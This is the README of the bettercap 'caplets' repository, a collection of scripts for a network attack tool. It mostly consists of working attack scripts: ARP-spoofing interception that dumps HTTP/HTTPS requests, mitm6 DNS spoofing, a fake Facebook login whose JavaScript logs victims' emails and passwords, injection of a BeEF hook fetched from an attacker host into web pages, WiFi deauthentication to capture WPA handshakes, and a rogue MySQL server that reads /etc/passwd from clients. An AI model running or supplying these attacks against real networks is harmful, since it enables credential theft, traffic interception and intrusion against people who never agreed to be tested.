# Caplets

[bettercap](https://github.com/bettercap/bettercap)'s interactive sessions can be scripted with `.cap` files, or `caplets`, the following are a few basic examples, look at this repo for more.

To install / update the caplets on your computer:

    git clone https://github.com/bettercap/caplets.git
    cd caplets
    sudo make install

#### http-req-dump.cap

Execute an ARP spoofing attack on the whole network (by default) or on a host (using `-eval` as described), intercept HTTP and HTTPS requests with the `http.proxy` and `https.proxy` modules and dump them using the `http-req-dumsp.js` proxy script.

```sh
# targeting the whole subnet by default, to make it selective:
#
#   sudo ./bettercap -caplet http-req-dump.cap -eval "set arp.spoof.targets 192.168.1.64"

# to make it less verbose
# events.stream off

# discover a few hosts 
net.probe on
sleep 1
net.probe off

# uncomment to enable sniffing too
# set net.sniff.verbose false
# set net.sniff.local true
# set net.sniff.filter tcp port 443
# net.sniff on

# we'll use this proxy script to dump requests
set https.proxy.script http-req-dump.js
set http.proxy.script http-req-dump.js
clear

# go ^_^
http.proxy on
https.proxy on
arp.spoof on
```

#### netmon.cap

An example of how to use the `ticker` module, use this caplet to monitor activities on your network.

```sh
net.probe on
clear
ticker on
```

#### mitm6.cap

[Reroute IPv4 DNS requests by using DHCPv6 replies](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/), start a HTTP server and DNS spoofer for `microsoft.com` and `google.com`.

```sh
# let's spoof Microsoft and Google ^_^
set dns.spoof.domains microsoft.com, google.com
set dhcp6.spoof.domains microsoft.com, google.com

# every http request to the spoofed hosts will come to us
# let's give em some contents
set http.server.path www

# serve files
http.server on
# redirect DNS request by spoofing DHCPv6 packets
dhcp6.spoof on
# send spoofed DNS replies ^_^
dns.spoof on

# set a custom prompt for ipv6
set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}» {reset}
# clear the events buffer and the screen
events.clear
clear
```

<center>
    <img src="https://pbs.twimg.com/media/DTXrMJJXcAE-NcQ.jpg:large" width="100%"/>
</center>

#### rest-api.cap

Start a rest API.

```sh
# change these!
set api.rest.username bcap
set api.rest.password bcap
# set api.rest.port 8082

# actively probe network for new hosts
net.probe on

# enjoy /api/session and /api/events
api.rest on
```

Get information about the current session:

    curl -k --user bcap:bcap https://bettercap-ip:8083/api/session

Execute a command in the current interactive session:

    curl -k --user bcap:bcap https://bettercap-ip:8083/api/session -H "Content-Type: application/json" -X POST -d '{"cmd":"net.probe on"}'

Get last 50 events:

    curl -k --user bcap:bcap https://bettercap-ip:8083/api/events?n=50

Clear events:

    curl -k --user bcap:bcap -X DELETE https://bettercap-ip:8083/api/events

<center>
    <img src="https://pbs.twimg.com/media/DTAreSCX4AAXX6v.jpg:large" width="100%"/>
</center>

#### fb-phish.cap

This caplet will create a fake Facebook login page on port 80, intercept login attempts using the `http.proxy`, print credentials and redirect the target to the real Facebook.

<center>
    <img src="https://pbs.twimg.com/media/DTY39bnXcAAg5jX.jpg:large" width="100%"/>
</center>

Make sure to create the folder first:

    $ cd www/
    $ make

```sh
set http.server.address 0.0.0.0
set http.server.path www/www.facebook.com/

set http.proxy.script fb-phish.js

http.proxy on
http.server on
```

The `fb-phish.js` proxy script file:

```javascript
function onRequest(req, res) {
    if( req.Method == "POST" && req.Path == "/login.php" && req.ContentType == "application/x-www-form-urlencoded" ) {
        var form = req.ParseForm();
        var email = form["email"] || "?", 
            pass  = form["pass"] || "?";

        log( R(req.Client), " > FACEBOOK > email:", B(email), " pass:'" + B(pass) + "'" );

        headers = res.Headers.split("\r\n")
        for (var i = 0; i < headers.length; i++) {
            header_name = headers[i].replace(/:.*/, "")
            res.RemoveHeader(header_name)
        }
        res.Status = 301;
        res.SetHeader("Location", "https://www.facebook.com")
        res.SetHeader("Connection", "close")
    }
}
```

#### beef-inject.cap

Use a proxy script to inject a BEEF javascript hook:

```sh
# targeting the whole subnet by default, to make it selective:
#
#   sudo ./bettercap -caplet beef-active.cap -eval "set arp.spoof.targets 192.168.1.64"

# inject beef hook
set http.proxy.script beef-inject.js
# redirect http traffic to a proxy
http.proxy on
# wait for everything to start properly
sleep 1
# make sure probing is off as it conflicts with arp spoofing
arp.spoof on
```

The `beef.inject.js` proxy script file:

```javascript
function onLoad() {
    console.log( "BeefInject loaded." );
    console.log("targets: " + env('arp.spoof.targets'));
}

function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                '</head>', 
                '<script type="text/javascript" src="http://your-beef-box:3000/hook.js"></script></head>' 
            ); 
        }
    }
}
```

#### airodump.cap

Put a wifi interface in monitor mode and listen for frames in order to detect WiF access points and clients.

```
set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
set ticker.commands clear; wifi.show

# uncomment to only hop on these channels:
# wifi.recon.channel 1,2,3

wifi.recon on
ticker on
events.clear
clear
```

#### wpa\_handshake.cap

Use various modules to inject wifi frames performing a deauthentication attack, while a sniffer is waiting for WPA handshakes.

```
# swag prompt for wifi
set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}

# Sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.
set net.sniff.verbose true
set net.sniff.filter ether proto 0x888e
set net.sniff.output wpa.pcap
net.sniff on

# since we need to capture the handshake, we can't hop
# through channels but we need to stick to the one we're
# interested in otherwise the sniffer might lose packets.
wifi.recon.channel 1

wifi.recon on

# uncomment to recon clients of a specific AP given its BSSID
# wifi.recon DE:AD:BE:EF:DE:AD

events.clear
clear

# now just deauth clients and wait ^_^
#
# Example:
#
# wifi.deauth AP-BSSID-HERE
#
# This will deauth every client for this specific access point,
# you can put it as ticker.commands to have the ticker module
# periodically deauth clients :D
```

#### rogue-mysql-server.cap

Execute an ARP spoofing attack against a single host and redirect the MySQL traffic to a rogue server. The rogue MySQL server will use the [LOCAL INFILE technique](https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html) to read files from the client.

```
# set the target for arp spoofing
set arp.spoof.targets 192.168.1.236

# bind rogue mysql server to localhost and
# set the file we want to read
set mysql.server.address 127.0.0.1
set mysql.server.port 3306
set mysql.server.infile /etc/passwd
mysql.server on

# set the ip from the mysql server we want to impersonate
set tcp.address 93.184.216.34
set tcp.port 3306

# set the ip from the rogue mysql server
set tcp.tunnel.address 127.0.0.1
set tcp.tunnel.port 3306

# go ^_^
tcp.proxy on
arp.spoof on
```

<center>
    <img src="https://2.bp.blogspot.com/-mnzdnrHhOrA/WuJfAL9WnXI/AAAAAAAAB3U/dvVATNf0GRQxeZJe-BKGwmY9hDO6mhAcQCPcBGAYYCw/s1600/rogue-mysql-arp.png" width="100%"/>
</center>

## License

`bettercap` is made with ♥  by [the dev team](https://github.com/orgs/bettercap/people) and it's released under the GPL 3 license.
